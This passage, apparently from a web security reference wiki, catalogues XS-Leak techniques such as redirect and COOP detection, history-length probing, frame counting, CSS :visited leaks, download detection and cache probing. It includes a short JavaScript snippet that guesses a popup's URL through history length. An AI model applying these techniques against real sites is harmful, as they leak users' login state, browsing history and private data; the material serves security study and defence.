reflected but a wildcard is used (<code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin: *</code>) this won’t work.</p> <h2 id="readable-attributes-technique">Readable Attributes Technique</h2> <h3 id="fetch-redirect">Fetch Redirect</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Status Code</li> <li> <strong>More info</strong>: <a href="https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html" rel="external nofollow noopener" target="_blank">https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html</a> </li> <li> <strong>Summary:</strong> GC and SA allow to check the response’s type (opaque-redirect) after the redirect is finished.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Fetch%20Redirect%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Fetch%20Redirect%20Leak</a> </li> </ul> <p>Submitting a request using the Fetch API with <code class="language-plaintext highlighter-rouge">redirect: "manual"</code> and other params, it’s possible to read the <code class="language-plaintext highlighter-rouge">response.type</code> attribute and if it’s equals to <code class="language-plaintext highlighter-rouge">opaqueredirect</code> then the response was a redirect.</p> <h3 id="coop">COOP</h3> <ul> <li> <strong>Inclusion Methods</strong>: Pop-ups</li> <li> <strong>Detectable Difference</strong>: Header</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.4), <a href="https://xsleaks.dev/docs/attacks/window-references/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/window-references/</a> </li> <li> <strong>Summary:</strong> Pages safeguarded by Cross-Origin Opener Policy (COOP) prevent access from cross-origin interactions.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#COOP%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#COOP%20Leak</a> </li> </ul> <p>An attacker is capable of deducing the presence of the Cross-Origin Opener Policy (COOP) header in a cross-origin HTTP response. COOP is utilized by web applications to hinder external sites from obtaining arbitrary window references. The visibility of this header can be discerned by attempting to access the <strong><code class="language-plaintext highlighter-rouge">contentWindow</code> reference</strong>. In scenarios where COOP is applied conditionally, the <strong><code class="language-plaintext highlighter-rouge">opener</code> property</strong> becomes a telltale indicator: it’s <strong>undefined</strong> when COOP is active, and <strong>defined</strong> in its absence.</p> <h3 id="url-max-length---server-side">URL Max Length - Server Side</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API, HTML Elements</li> <li> <strong>Detectable Difference</strong>: Status Code / Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects</a> </li> <li> <strong>Summary:</strong> Detect differences in responses because of the redirect response length migt be too large that the server replays with an error and an alert is generated.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#URL%20Max%20Length%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#URL%20Max%20Length%20Leak</a> </li> </ul> <p>If a server-side redirect uses <strong>user input inside the redirection</strong> and <strong>extra data</strong>. It’s possible to detect this behaviour because usually <strong>servers</strong> has a <strong>limit request length</strong>. If the <strong>user data</strong> is that <strong>length - 1</strong>, because the <strong>redirect</strong> is using <strong>that data</strong> and <strong>adding</strong> something <strong>extra</strong>, it will trigger an <strong>error detectable via Error Events</strong>.</p> <p>If you can somehow set cookies to a user, you can also perform this attack by <strong>setting enough cookies</strong> (<a href="hacking-with-cookies/cookie-bomb.md"><strong>cookie bomb</strong></a>) so with the <strong>response increased size</strong> of the <strong>correct response</strong> an <strong>error</strong> is triggered. In this case, remember that is you trigger this request from a same site, <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> will automatically send the cookies (so you can check for errors).<br> An example of the <strong>cookie bomb + XS-Search</strong> can be found in the Intended solution of this writeup: <a href="https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended" rel="external nofollow noopener" target="_blank">https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended</a></p> <p><code class="language-plaintext highlighter-rouge">SameSite=None</code> or to be in the same context is usually needed for this type of attack.</p> <h3 id="url-max-length---client-side">URL Max Length - Client Side</h3> <ul> <li> <strong>Inclusion Methods</strong>: Pop-ups</li> <li> <strong>Detectable Difference</strong>: Status Code / Content</li> <li> <strong>More info</strong>: <a href="https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit" rel="external nofollow noopener" target="_blank">https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit</a> </li> <li> <strong>Summary:</strong> Detect differences in responses because of the redirect response length might too large for a request that a difference can be noticed.</li> <li> <strong>Code Example</strong>: <a href="https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit" rel="external nofollow noopener" target="_blank">https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit</a> </li> </ul> <p>According to <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length" rel="external nofollow noopener" target="_blank">Chromium documentation</a>, Chrome’s maximum URL length is 2MB.</p> <blockquote> <p>In general, the <em>web platform</em> does not have limits on the length of URLs (although 2^31 is a common limit). <em>Chrome</em> limits URLs to a maximum length of <strong>2MB</strong> for practical reasons and to avoid causing denial-of-service problems in inter-process communication.</p> </blockquote> <p>Therefore if the <strong>redirect URL responded is larger in one of the cases</strong>, it’s possible to make it redirect with a <strong>URL larger than 2MB</strong> to hit the <strong>length limit</strong>. When this happens, Chrome shows an <strong><code class="language-plaintext highlighter-rouge">about:blank#blocked</code></strong> page.</p> <p>The <strong>noticeable difference</strong>, is that if the <strong>redirect</strong> was <strong>completed</strong>, <code class="language-plaintext highlighter-rouge">window.origin</code> throws an <strong>error</strong> because a cross origin cannot access that info. However, if the <strong>limit</strong> was **** hit and the loaded page was <strong><code class="language-plaintext highlighter-rouge">about:blank#blocked</code></strong> the window’s <strong><code class="language-plaintext highlighter-rouge">origin</code></strong> remains that of the <strong>parent</strong>, which is an <strong>accessible information.</strong></p> <p>All the extra info needed to reach the <strong>2MB</strong> can be added via a <strong>hash</strong> in the initial URL so it will be <strong>used in the redirect</strong>.</p> <p>xs-search/url-max-length-client-side.md</p> <h3 id="max-redirects">Max Redirects</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API, Frames</li> <li> <strong>Detectable Difference</strong>: Status Code</li> <li> <strong>More info</strong>: <a href="https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76" rel="external nofollow noopener" target="_blank">https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76</a> </li> <li> <strong>Summary:</strong> User the browser’s redirect limit to ascertain the occurrence of URL redirections.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Max%20Redirect%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Max%20Redirect%20Leak</a> </li> </ul> <p>If the <strong>max</strong> number of <strong>redirects</strong> to follow of a browser is <strong>20</strong>, an attacker could try to load his page with <strong>19 redirects</strong> and finally <strong>send the victim</strong> to the tested page. If an <strong>error</strong> is triggered, then the page was trying to <strong>redirect the victim</strong>.</p> <h3 id="history-length">History Length</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, Pop-ups</li> <li> <strong>Detectable Difference</strong>: Redirects</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/navigations/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/navigations/</a> </li> <li> <strong>Summary:</strong> JavaScript code manipulates the browser history and can be accessed by the length property.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#History%20Length%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#History%20Length%20Leak</a> </li> </ul> <p>The <strong>History API</strong> allows JavaScript code to manipulate the browser history, which <strong>saves the pages visited by a user</strong>. An attacker can use the length property as an inclusion method: to detect JavaScript and HTML navigation.<br> <strong>Checking <code class="language-plaintext highlighter-rouge">history.length</code></strong>, making a user <strong>navigate</strong> to a page, <strong>change</strong> it <strong>back</strong> to the same-origin and <strong>checking</strong> the new value of <strong><code class="language-plaintext highlighter-rouge">history.length</code></strong>.</p> <h3 id="history-length-with-same-url">History Length with same URL</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, Pop-ups</li> <li> <strong>Detectable Difference</strong>: If URL is the same as the guessed one</li> <li> <strong>Summary:</strong> It’s possible to guess if the location of a frame/popup is in an specific URL abusing the history length.</li> <li> <strong>Code Example</strong>: Below</li> </ul> <p>An attacker could use JavaScript code to <strong>manipulate the frame/pop-up location to a guessed one</strong> and <strong>immediately</strong> <strong>change it to <code class="language-plaintext highlighter-rouge">about:blank</code></strong>. If the history length increased it means the URL was correct and it had time to <strong>increase because the URL isn’t reloaded if it’s the same</strong>. If it didn’t increased it means it <strong>tried to load the guessed URL</strong> but because we <strong>immediately after</strong> loaded <strong><code class="language-plaintext highlighter-rouge">about:blank</code></strong>, the <strong>history length did never increase</strong> when loading the guessed url.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nx">win</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">win</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nx">url</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">#aaa</span><span class="dl">"</span><span class="p">;</span>
  <span class="nx">win</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">about:blank</span><span class="dl">"</span><span class="p">;</span>
  <span class="k">await</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="mi">500</span><span class="p">));</span>
  <span class="k">return</span> <span class="nx">win</span><span class="p">.</span><span class="nx">history</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://example.com/?a=b</span><span class="dl">"</span><span class="p">);</span>
<span class="k">await</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="mi">2000</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="k">await</span> <span class="nf">debug</span><span class="p">(</span><span class="nx">win</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://example.com/?a=c</span><span class="dl">"</span><span class="p">));</span>

<span class="nx">win</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
<span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://example.com/?a=b</span><span class="dl">"</span><span class="p">);</span>
<span class="k">await</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="mi">2000</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="k">await</span> <span class="nf">debug</span><span class="p">(</span><span class="nx">win</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://example.com/?a=b</span><span class="dl">"</span><span class="p">));</span>
</code></pre></div></div> <h3 id="frame-counting">Frame Counting</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, Pop-ups</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/frame-counting/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/frame-counting/</a> </li> <li> <strong>Summary:</strong> Evaluate the quantity of iframe elements by inspecting the <code class="language-plaintext highlighter-rouge">window.length</code> property.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Frame%20Count%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Frame%20Count%20Leak</a> </li> </ul> <p>Counting the <strong>number of frames in a web</strong> opened via <code class="language-plaintext highlighter-rouge">iframe</code> or <code class="language-plaintext highlighter-rouge">window.open</code> might help to identify the <strong>status of the user over that page</strong>.<br> Moreover, if the page has always the same number of frames, checking <strong>continuously</strong> the number of frames might help to identify a <strong>pattern</strong> that might leak info.</p> <p>An example of this technique is that in chrome, a <strong>PDF</strong> can be <strong>detected</strong> with <strong>frame counting</strong> because an <code class="language-plaintext highlighter-rouge">embed</code> is used internally. There are <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113" rel="external nofollow noopener" target="_blank">Open URL Parameters</a> that allow some control over the content such as <code class="language-plaintext highlighter-rouge">zoom</code>, <code class="language-plaintext highlighter-rouge">view</code>, <code class="language-plaintext highlighter-rouge">page</code>, <code class="language-plaintext highlighter-rouge">toolbar</code> where this technique could be interesting.</p> <h3 id="htmlelements">HTMLElements</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/element-leaks/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/element-leaks/</a> </li> <li> <strong>Summary:</strong> Read the leaked value to distinguish between 2 possible states</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/element-leaks/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/element-leaks/</a>, <a href="https://xsinator.com/testing.html#Media%20Dimensions%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Media%20Dimensions%20Leak</a>, <a href="https://xsinator.com/testing.html#Media%20Duration%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Media%20Duration%20Leak</a> </li> </ul> <p>Information leakage through HTML elements is a concern in web security, particularly when dynamic media files are generated based on user information, or when watermarks are added, altering the media size. This can be exploited by attackers to differentiate between possible states by analyzing the information exposed by certain HTML elements.</p> <h3 id="information-exposed-by-html-elements">Information Exposed by HTML Elements</h3> <ul> <li> <strong>HTMLMediaElement</strong>: This element reveals the media’s <code class="language-plaintext highlighter-rouge">duration</code> and <code class="language-plaintext highlighter-rouge">buffered</code> times, which can be accessed via its API. <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement" rel="external nofollow noopener" target="_blank">Read more about HTMLMediaElement</a> </li> <li> <strong>HTMLVideoElement</strong>: It exposes <code class="language-plaintext highlighter-rouge">videoHeight</code> and <code class="language-plaintext highlighter-rouge">videoWidth</code>. In some browsers, additional properties like <code class="language-plaintext highlighter-rouge">webkitVideoDecodedByteCount</code>, <code class="language-plaintext highlighter-rouge">webkitAudioDecodedByteCount</code>, and <code class="language-plaintext highlighter-rouge">webkitDecodedFrameCount</code> are available, offering more in-depth information about the media content. <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement" rel="external nofollow noopener" target="_blank">Read more about HTMLVideoElement</a> </li> <li> <strong>getVideoPlaybackQuality()</strong>: This function provides details about video playback quality, including <code class="language-plaintext highlighter-rouge">totalVideoFrames</code>, which can indicate the amount of video data processed. <a href="https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality" rel="external nofollow noopener" target="_blank">Read more about getVideoPlaybackQuality()</a> </li> <li> <strong>HTMLImageElement</strong>: This element leaks the <code class="language-plaintext highlighter-rouge">height</code> and <code class="language-plaintext highlighter-rouge">width</code> of an image. However, if an image is invalid, these properties will return 0, and the <code class="language-plaintext highlighter-rouge">image.decode()</code> function will be rejected, indicating the failure to load the image properly. <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement" rel="external nofollow noopener" target="_blank">Read more about HTMLImageElement</a> </li> </ul> <h3 id="css-property">CSS Property</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle</a>, <a href="https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html" rel="external nofollow noopener" target="_blank">https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html</a> </li> <li> <strong>Summary:</strong> Identify variations in website styling that correlate with the user’s state or status.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#CSS%20Property%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#CSS%20Property%20Leak</a> </li> </ul> <p>Web applications may change w<strong>ebsite styling depending on the status of the use</strong>. Cross-origin CSS files can be embedded on the attacker page with the <strong>HTML link element</strong>, and the <strong>rules</strong> will be <strong>applied</strong> to the attacker page. If a page dynamically changes these rules, an attacker can <strong>detect</strong> these <strong>differences</strong> depending on the user state.<br> As a leak technique, the attacker can use the <code class="language-plaintext highlighter-rouge">window.getComputedStyle</code> method to <strong>read CSS</strong> properties of a specific HTML element. As a result, an attacker can read arbitrary CSS properties if the affected element and property name is known.</p> <h3 id="css-history">CSS History</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history</a> </li> <li> <strong>Summary:</strong> Detect if the <code class="language-plaintext highlighter-rouge">:visited</code> style is applied to an URL indicating it was already visited</li> <li> <strong>Code Example</strong>: <a href="http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html" rel="external nofollow noopener" target="_blank">http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html</a> </li> </ul> <blockquote> <p>[!NOTE] According to <a href="https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/" rel="external nofollow noopener" target="_blank"><strong>this</strong></a>, this is not working in headless Chrome.</p> </blockquote> <p>The CSS <code class="language-plaintext highlighter-rouge">:visited</code> selector is utilized to style URLs differently if they have been previously visited by the user. In the past, the <code class="language-plaintext highlighter-rouge">getComputedStyle()</code> method could be employed to identify these style differences. However, modern browsers have implemented security measures to prevent this method from revealing the state of a link. These measures include always returning the computed style as if the link were visited and restricting the styles that can be applied with the <code class="language-plaintext highlighter-rouge">:visited</code> selector.</p> <p>Despite these restrictions, it’s possible to discern the visited state of a link indirectly. One technique involves tricking the user into interacting with an area affected by CSS, specifically utilizing the <code class="language-plaintext highlighter-rouge">mix-blend-mode</code> property. This property allows the blending of elements with their background, potentially revealing the visited state based on user interaction.</p> <p>Furthermore, detection can be achieved without user interaction by exploiting the rendering timings of links. Since browsers may render visited and unvisited links differently, this can introduce a measurable time difference in rendering. A proof of concept (PoC) was mentioned in a Chromium bug report, demonstrating this technique using multiple links to amplify the timing difference, thereby making the visited state detectable through timing analysis.</p> <p>For further details on these properties and methods, visit their documentation pages:</p> <ul> <li> <code class="language-plaintext highlighter-rouge">:visited</code>: <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:visited" rel="external nofollow noopener" target="_blank">MDN Documentation</a> </li> <li> <code class="language-plaintext highlighter-rouge">getComputedStyle()</code>: <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle" rel="external nofollow noopener" target="_blank">MDN Documentation</a> </li> <li> <code class="language-plaintext highlighter-rouge">mix-blend-mode</code>: <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode" rel="external nofollow noopener" target="_blank">MDN Documentation</a> </li> </ul> <h3 id="contentdocument-x-frame-leak">ContentDocument X-Frame Leak</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Headers</li> <li> <strong>More info</strong>: <a href="https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf" rel="external nofollow noopener" target="_blank">https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf</a> </li> <li> <strong>Summary:</strong> In Google Chrome, a dedicated error page is displayed when a page is blocked from being embedded on a cross-origin site due to X-Frame-Options restrictions.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak</a> </li> </ul> <p>In Chrome, if a page with the <code class="language-plaintext highlighter-rouge">X-Frame-Options</code> header set to “deny” or “same-origin” is embedded as an object, an error page appears. Chrome uniquely returns an empty document object (instead of <code class="language-plaintext highlighter-rouge">null</code>) for the <code class="language-plaintext highlighter-rouge">contentDocument</code> property of this object, unlike in iframes or other browsers. Attackers could exploit this by detecting the empty document, potentially revealing information about the user’s state, especially if developers inconsistently set the X-Frame-Options header, often overlooking error pages. Awareness and consistent application of security headers are crucial for preventing such leaks.</p> <h3 id="download-detection-1">Download Detection</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, Pop-ups</li> <li> <strong>Detectable Difference</strong>: Headers</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/navigations/#download-trigger" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#download-trigger</a> </li> <li> <strong>Summary:</strong> An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/navigations/#download-bar" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#download-bar</a> </li> </ul> <p>The <code class="language-plaintext highlighter-rouge">Content-Disposition</code> header, specifically <code class="language-plaintext highlighter-rouge">Content-Disposition: attachment</code>, instructs the browser to download content rather than display it inline. This behavior can be exploited to detect whether a user has access to a page that triggers a file download. In Chromium-based browsers, there are a few techniques to detect this download behavior:</p> <ol> <li> <strong>Download Bar Monitoring</strong>: <ul> <li>When a file is downloaded in Chromium-based browsers, a download bar appears at the bottom of the browser window.</li> <li>By monitoring changes in the window height, attackers can infer the appearance of the download bar, suggesting that a download has been initiated.</li> </ul> </li> <li> <strong>Download Navigation with Iframes</strong>: <ul> <li>When a page triggers a file download using the <code class="language-plaintext highlighter-rouge">Content-Disposition: attachment</code> header, it does not cause a navigation event.</li> <li>By loading the content in an iframe and monitoring for navigation events, it’s possible to check if the content disposition causes a file download (no navigation) or not.</li> </ul> </li> <li> <strong>Download Navigation without Iframes</strong>: <ul> <li>Similar to the iframe technique, this method involves using <code class="language-plaintext highlighter-rouge">window.open</code> instead of an iframe.</li> <li>Monitoring navigation events in the newly opened window can reveal whether a file download was triggered (no navigation) or if the content is displayed inline (navigation occurs).</li> </ul> </li> </ol> <p>In scenarios where only logged-in users can trigger such downloads, these techniques can be used to indirectly infer the user’s authentication state based on the browser’s response to the download request.</p> <h3 id="partitioned-http-cache-bypass-">Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>: Pop-ups</li> <li> <strong>Detectable Difference</strong>: Timing</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass</a> </li> <li> <strong>Summary:</strong> An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass</a>, <a href="https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722" rel="external nofollow noopener" target="_blank">https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722</a> (from <a href="https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/" rel="external nofollow noopener" target="_blank">https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/</a>)</li> </ul> <blockquote> <p>[!WARNING] This is why this technique is interesting: Chrome now has <strong>cache partitioning</strong>, and the cache key of the newly opened page is: <code class="language-plaintext highlighter-rouge">(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)</code>, but if I open an ngrok page and use fetch in it, the cache key will be: <code class="language-plaintext highlighter-rouge">(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)</code>, the <strong>cache key is different</strong>, so the cache cannot be shared. You can find more detail here: <a href="https://developer.chrome.com/blog/http-cache-partitioning/" rel="external nofollow noopener" target="_blank">Gaining security and privacy by partitioning the cache</a><br> (Comment from <a href="https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/" rel="external nofollow noopener" target="_blank"><strong>here</strong></a>)</p> </blockquote> <p>If a site <code class="language-plaintext highlighter-rouge">example.com</code> includes a resource from <code class="language-plaintext highlighter-rouge">*.example.com/resource</code> then that resource will have the <strong>same caching key</strong> as if the resource was directly <strong>requested through top-level navigation</strong>. That is because the caching key is consisted of top-level <em>eTLD+1</em> and frame <em>eTLD+1</em>.</p> <p>Because accessing the cache is faster than loading a resource, it’s possible to try to change the location of a page and cancel it 20ms (for example) after. If the origin was changed after the stop, it means that the resource was cached.<br> Or could just <strong>send some fetch to the pontentially cached page and measure the time it takes</strong>.</p> <h3 id="manual-redirect-">Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Redirects</li> <li> <strong>More info</strong>: <a href="https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234" rel="external nofollow noopener" target="_blank">ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234</a> </li> <li> <strong>Summary:</strong> It’s possible to find out if a response to a fetch request is a redirect</li> <li> <strong>Code Example</strong>:</li> </ul> <p><img src="../images/image%20(652).png" alt=""></p> <h3 id="fetch-with-abortcontroller-">Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Timing</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller</a> </li> <li> <strong>Summary:</strong> It’s possible to try to load a resource and about before it’s loaded the loading is interrupted. Depending on if an error is triggered, the resource was or wasn’t cached.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller</a> </li> </ul> <p>Use <em><strong>fetch</strong></em> and <em><strong>setTimeout</strong></em> with an <strong>AbortController</strong> to both detect whether the <strong>resource is cached</strong> and to evict a specific resource from the browser cache. Moreover, the process occurs without caching new content.</p> <h3 id="script-pollution">Script Pollution</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements (script)</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/element-leaks/#script-tag" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/element-leaks/#script-tag</a> </li> <li> <strong>Summary:</strong> It’s possible to <strong>overwrite built-in functions</strong> and read their arguments which even from <strong>cross-origin script</strong> (which cannot be read directly), this might <strong>leak valuable information</strong>.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/element-leaks/#script-tag" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/element-leaks/#script-tag</a> </li> </ul> <h3 id="service-workers-">Service Workers <a href="#service-workers" id="service-workers"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>: Pop-ups</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers</a> </li> <li> <strong>Summary:</strong> Measure execution time of a web using service workers.</li> <li> <strong>Code Example</strong>:</li> </ul> <p>In the given scenario, the attacker takes the initiative to register a <strong>service worker</strong> within one of their domains, specifically “attacker.com”. Next, the attacker opens a new window in the target website from the main document and instructs the <strong>service worker</strong> to commence a timer. As 